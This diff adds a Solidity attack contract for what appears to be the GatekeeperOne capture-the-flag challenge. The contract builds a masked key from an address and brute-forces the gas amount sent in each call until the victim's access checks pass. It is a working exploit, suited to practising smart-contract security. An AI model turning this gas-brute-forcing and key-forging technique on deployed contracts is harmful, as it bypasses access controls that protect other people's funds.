@@ -1,0 +1,23 @@
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+import "./GatekeeperOne.sol";
+contract Attack_GKOne {
+    bytes8 txOrigin16 = 0x5522D737b16B9F14;
+    bytes8 key = txOrigin16 & 0xFFFFFFFF0000FFFF;
+    GatekeeperOne public victim;
+    constructor (address _victim) {
+        victim = GatekeeperOne(_victim);
+    }
+
+    function attack() public {
+        for (uint256 i = 0 ; i < 8191; i ++) {
+            (bool result , ) = address(victim).call{gas : i + 8191 * 3}(abi.encodeWithSignature("enter(bytes8)", key));
+            if(result){
+                break;
+        }
+        }
+       
+
+    }
+
+}
